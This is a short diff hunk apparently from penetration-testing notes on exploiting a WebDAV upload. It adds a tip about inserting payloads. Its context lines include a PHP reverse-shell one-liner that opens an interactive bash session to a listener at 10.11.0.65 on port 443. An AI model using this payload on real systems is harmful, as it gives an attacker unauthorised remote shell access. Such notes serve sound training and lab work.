@@ -125,6 +125,7 @@ load URL, http://<REMOTE HOST>/webdav/helloworld.txr
 		```pentestmonkey
 		<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.65/443 0>&1");?>
 		```
+		When inserting a payload, try host IP and http://hostIP
 
 		Set up listener
 
